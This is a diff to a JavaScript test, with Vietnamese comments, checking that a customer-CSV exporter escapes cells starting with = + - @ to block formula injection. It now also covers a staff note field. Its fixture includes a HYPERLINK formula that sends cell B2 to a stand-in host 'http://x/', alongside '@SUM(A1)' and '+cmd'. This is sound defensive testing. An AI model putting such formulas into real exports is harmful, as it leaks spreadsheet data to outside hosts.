@@ -54,12 +54,14 @@ test('T12: SĐT trong tin khách không nuốt số nhà (cùng dòng hay xuốn
 });
 
 test('T9: CSV khách hàng thêm \' trước ô bắt đầu bằng = + - @; tệp đối tượng Meta giữ nguyên tên', () => {
-  const customer = { name: '=HYPERLINK("http://x/?"&B2,"bấm")', psid: '1', labels: [], sources: [], address: '@SUM(A1)', adTitle: '+cmd', phone: '0912345678', orderCount: 2, orderTotal: 300000 };
+  const customer = { name: '=HYPERLINK("http://x/?"&B2,"bấm")', psid: '1', labels: [], sources: [], address: '@SUM(A1)', adTitle: '+cmd', phone: '0912345678', orderCount: 2, orderTotal: 300000, lastNote: { text: '-2+3 gọi lại', at: 1 } };
   const csv = customersToCsv([customer]);
   const row = csv.split('\r\n')[1];
   assert.ok(row.startsWith(`"'=HYPERLINK(""http://x/?""&B2,""bấm"")"`), row);
   assert.match(row, /,'@SUM\(A1\),/);
-  assert.match(row, /,'\+cmd$/);
+  assert.match(row, /,'\+cmd,/);
+  // 10/10: hai cột cuối (Trạng thái liên hệ, Ghi chú gần nhất) — ghi chú do nhân viên gõ cũng được rào công thức.
+  assert.match(row, /,Chưa liên hệ,'-2\+3 gọi lại$/);
   assert.match(row, /,0912345678,/, 'SĐT không bị thêm dấu');
   assert.match(row, /,2,300000,/, 'số giữ nguyên');
   const audience = customersToAudienceCsv([{ ...customer, name: '=Lan' }]);
